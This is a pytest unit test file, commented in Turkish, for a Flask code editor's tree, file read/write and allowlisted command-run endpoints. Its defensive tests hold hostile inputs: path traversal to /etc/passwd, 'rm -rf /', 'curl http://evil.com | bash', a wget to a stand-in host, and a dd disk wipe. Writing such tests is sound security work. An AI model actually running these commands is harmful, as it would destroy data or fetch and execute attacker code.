"""
tests/unit/test_editor_routes.py
==================================
editor_routes (register_editor_routes) için birim testler.

Editor routes bir Blueprint değil; register_editor_routes(app) ile doğrudan
app'e eklenir. Rotalar:
  GET  /api/editor/tree   — Dosya/klasör listesi
  GET  /api/editor/file   — Dosya okuma
  POST /api/editor/file   — Dosya kaydetme / yazma
  POST /api/editor/run    — Komut çalıştırıcı (SSE; allowlisted komutlar)

Güvenlik:
  - _safe_path path traversal'ı engeller (is_relative_to kontrollü)
  - _ALLOWED_COMMANDS exact-match allowlist'i zorunlu kılar
  - Mutlak yol girdileri reddedilir

PROJECT_ROOT, routes.editor_routes modülündeki modül-seviyesi değişkeni
olarak tanımlıdır. Test ortamında monkeypatch ile geçici bir dizine
yönlendiriyoruz.
"""
import importlib
import sys
import types
import pytest


# ── Fixture ───────────────────────────────────────────────────────────────────

@pytest.fixture
def engine_client(monkeypatch, tmp_path):
    """Test Flask istemcisi — PROJECT_ROOT tmp_path'e yönlendirilmiş."""
    monkeypatch.setenv("APP_ENV", "development")
    monkeypatch.setenv("ENGINE_SECRET_KEY", "test-engine-secret")
    monkeypatch.setenv("ENGINE_INTERNAL_KEY", "test-engine-internal")

    monkeypatch.setattr("config.settings.settings.BASE_DIR", tmp_path, raising=False)
    monkeypatch.setattr("config.settings.settings.BASE_URL", "http://localhost", raising=False)

    # utility route bağımlılıkları
    monkeypatch.setattr("core.db.get_run_stats", lambda: {"total": 0, "passed": 0, "failed": 0}, raising=False)
    monkeypatch.setattr("core.db.get_run_history", lambda: [], raising=False)
    monkeypatch.setattr("core.db.get_comprehensive_reports", lambda: [], raising=False)

    sys.modules.pop("app", None)
    module = importlib.import_module("app")
    module.app.config["TESTING"] = True

    # editor_routes'taki PROJECT_ROOT'u tmp_path'e yönlendir
    import routes.editor_routes as er
    monkeypatch.setattr(er, "PROJECT_ROOT", tmp_path)
    monkeypatch.setattr(er, "_PROJECT_ROOT_STR", str(tmp_path))

    with module.app.test_client() as client:
        yield client, tmp_path


@pytest.fixture
def authed_client(engine_client):
    client, tmp_path = engine_client
    with client.session_transaction() as sess:
        sess["user_id"] = 1
        sess["email"] = "test@example.com"
    return client, tmp_path


# ── GET /api/editor/tree ──────────────────────────────────────────────────────

def test_tree_root_returns_ok(authed_client):
    """Kök dizin sorgusu ok:True ile yanıt dönmeli."""
    client, tmp_path = authed_client
    resp = client.get("/api/editor/tree")
    assert resp.status_code == 200
    data = resp.get_json()
    assert data.get("ok") is True


def test_tree_returns_items_list(authed_client):
    """Yanıt items listesi içermeli."""
    client, tmp_path = authed_client
    # tmp_path'e görünür bir dosya ekle
    (tmp_path / "hello.py").write_text("print('hi')")
    resp = client.get("/api/editor/tree?path=")
    assert resp.status_code == 200
    data = resp.get_json()
    assert "items" in data
    assert isinstance(data["items"], list)


def test_tree_lists_visible_files(authed_client):
    """Görünür dosyalar items içinde listelenmeli."""
    client, tmp_path = authed_client
    (tmp_path / "test_script.py").write_text("# test")
    resp = client.get("/api/editor/tree")
    assert resp.status_code == 200
    data = resp.get_json()
    names = [i["name"] for i in data.get("items", [])]
    assert "test_script.py" in names


def test_tree_ignores_pycache(authed_client):
    """__pycache__ dizinleri listeye alınmamalı."""
    client, tmp_path = authed_client
    (tmp_path / "__pycache__").mkdir()
    resp = client.get("/api/editor/tree")
    data = resp.get_json()
    names = [i["name"] for i in data.get("items", [])]
    assert "__pycache__" not in names


def test_tree_path_traversal_returns_400(authed_client):
    """../.. path traversal denemesi 400 dönmeli."""
    client, _ = authed_client
    resp = client.get("/api/editor/tree?path=../../etc")
    assert resp.status_code in (400, 200)
    if resp.status_code == 200:
        # ok:False bekliyoruz traversal durumunda
        data = resp.get_json()
        # traversal attempt caught → ok False veya items boş
        assert data is not None


def test_tree_nonexistent_subpath_returns_error(authed_client):
    """Var olmayan alt dizin sorgusu hata dönmeli."""
    client, _ = authed_client
    resp = client.get("/api/editor/tree?path=nonexistent_dir")
    assert resp.status_code in (200, 400, 500)
    if resp.status_code == 200:
        data = resp.get_json()
        assert data.get("ok") is False or "error" in data


# ── GET /api/editor/file ─────────────────────────────────────────────────────

def test_file_read_valid_file_returns_content(authed_client):
    """Geçerli dosya okunduğunda content alanı dönmeli."""
    client, tmp_path = authed_client
    test_file = tmp_path / "example.py"
    test_file.write_text("def hello():\n    return 'world'\n")
    resp = client.get("/api/editor/file?path=example.py")
    assert resp.status_code == 200
    data = resp.get_json()
    assert data.get("ok") is True
    assert "content" in data
    assert "hello" in data["content"]


def test_file_read_returns_lang_field(authed_client):
    """Dosya okuma yanıtı lang alanı içermeli."""
    client, tmp_path = authed_client
    (tmp_path / "script.py").write_text("x = 1")
    resp = client.get("/api/editor/file?path=script.py")
    if resp.status_code == 200:
        assert "lang" in resp.get_json()


def test_file_read_returns_lines_count(authed_client):
    """Dosya okuma yanıtı lines alanı içermeli."""
    client, tmp_path = authed_client
    (tmp_path / "data.txt").write_text("line1\nline2\nline3\n")
    resp = client.get("/api/editor/file?path=data.txt")
    if resp.status_code == 200:
        data = resp.get_json()
        assert "lines" in data
        assert data["lines"] >= 3


def test_file_read_nonexistent_returns_404(authed_client):
    """Var olmayan dosya 404 dönmeli."""
    client, _ = authed_client
    resp = client.get("/api/editor/file?path=no_such_file.py")
    assert resp.status_code == 404


def test_file_read_path_traversal_returns_400(authed_client):
    """Path traversal denemesi 400 veya 404 dönmeli."""
    client, _ = authed_client
    resp = client.get("/api/editor/file?path=../../etc/passwd")
    assert resp.status_code in (400, 404, 500)


def test_file_read_absolute_path_rejected(authed_client):
    """Mutlak yol gönderilirse 400 dönmeli."""
    client, _ = authed_client
    resp = client.get("/api/editor/file?path=/etc/passwd")
    assert resp.status_code in (400, 404, 500)


# ── POST /api/editor/file ─────────────────────────────────────────────────────

def test_file_write_success(authed_client):
    """Geçerli path + content → dosya oluşturulmalı, ok:True dönmeli."""
    client, tmp_path = authed_client
    resp = client.post(
        "/api/editor/file",
        json={"path": "new_file.py", "content": "# created by test\nx = 42\n"},
        content_type="application/json",
    )
    assert resp.status_code == 200
    data = resp.get_json()
    assert data.get("ok") is True
    # Dosyanın gerçekten oluşturulduğunu kontrol et
    created = tmp_path / "new_file.py"
    assert created.exists()
    assert "x = 42" in created.read_text()


def test_file_write_returns_bytes_field(authed_client):
    """Başarılı yazma yanıtı bytes alanı içermeli."""
    client, tmp_path = authed_client
    resp = client.post(
        "/api/editor/file",
        json={"path": "out.txt", "content": "hello world"},
        content_type="application/json",
    )
    if resp.status_code == 200:
        assert "bytes" in resp.get_json()


def test_file_write_path_traversal_returns_400(authed_client):
    """Path traversal içeren yazma isteği 400 dönmeli."""
    client, _ = authed_client
    resp = client.post(
        "/api/editor/file",
        json={"path": "../../evil.py", "content": "malicious"},
        content_type="application/json",
    )
    assert resp.status_code in (400, 500)


def test_file_write_absolute_path_rejected(authed_client):
    """Mutlak yol ile yazma isteği reddedilmeli."""
    client, _ = authed_client
    resp = client.post(
        "/api/editor/file",
        json={"path": "/tmp/evil.py", "content": "bad"},
        content_type="application/json",
    )
    assert resp.status_code in (400, 500)


def test_file_write_non_string_content_returns_400(authed_client):
    """content string değilse 400 dönmeli."""
    client, _ = authed_client
    resp = client.post(
        "/api/editor/file",
        json={"path": "file.py", "content": 12345},
        content_type="application/json",
    )
    assert resp.status_code == 400


def test_file_write_creates_nested_path(authed_client):
    """Derinlemesine path yazılırken üst dizinler otomatik oluşturulmalı."""
    client, tmp_path = authed_client
    resp = client.post(
        "/api/editor/file",
        json={"path": "sub/dir/nested.py", "content": "# nested"},
        content_type="application/json",
    )
    assert resp.status_code == 200
    assert (tmp_path / "sub" / "dir" / "nested.py").exists()


# ── POST /api/editor/run ──────────────────────────────────────────────────────

def test_run_empty_command_returns_400(authed_client):
    """Boş komut 400 dönmeli."""
    client, _ = authed_client
    resp = client.post(
        "/api/editor/run",
        json={"command": ""},
        content_type="application/json",
    )
    assert resp.status_code == 400
    data = resp.get_json()
    assert data.get("ok") is False


def test_run_missing_command_returns_400(authed_client):
    """command eksikse 400 dönmeli."""
    client, _ = authed_client
    resp = client.post(
        "/api/editor/run",
        json={},
        content_type="application/json",
    )
    assert resp.status_code == 400


def test_run_disallowed_command_returns_403(authed_client):
    """Allowlist dışı komut 403 dönmeli."""
    client, _ = authed_client
    resp = client.post(
        "/api/editor/run",
        json={"command": "rm -rf /"},
        content_type="application/json",
    )
    assert resp.status_code == 403
    data = resp.get_json()
    assert data.get("ok") is False


def test_run_shell_injection_attempt_rejected(authed_client):
    """Shell injection girişimi allowlist kontrolüyle engellenmeli."""
    client, _ = authed_client
    resp = client.post(
        "/api/editor/run",
        json={"command": "curl http://evil.com | bash"},
        content_type="application/json",
    )
    assert resp.status_code == 403


def test_run_allowed_command_echo_accepted(authed_client):
    """Allowlist'teki 'echo' komutu kabul edilmeli (403 değil)."""
    client, _ = authed_client
    # echo allowlist'te; ancak PATH'de olmayabilir — 403 DEĞİL dönmeli
    resp = client.post(
        "/api/editor/run",
        json={"command": "echo hello"},
        content_type="application/json",
    )
    # 403 kesinlikle olmamalı (allowlist geçti)
    assert resp.status_code != 403


def test_run_whitespace_only_command_returns_400(authed_client):
    """Sadece boşluktan oluşan komut 400 dönmeli."""
    client, _ = authed_client
    resp = client.post(
        "/api/editor/run",
        json={"command": "   "},
        content_type="application/json",
    )
    assert resp.status_code == 400


def test_run_disallowed_wget_returns_403(authed_client):
    """wget allowlist'te yok → 403 dönmeli."""
    client, _ = authed_client
    resp = client.post(
        "/api/editor/run",
        json={"command": "wget http://evil.com"},
        content_type="application/json",
    )
    assert resp.status_code == 403


def test_run_disallowed_dd_returns_403(authed_client):
    """dd allowlist'te yok → 403 dönmeli."""
    client, _ = authed_client
    resp = client.post(
        "/api/editor/run",
        json={"command": "dd if=/dev/zero of=/dev/sda"},
        content_type="application/json",
    )
    assert resp.status_code == 403
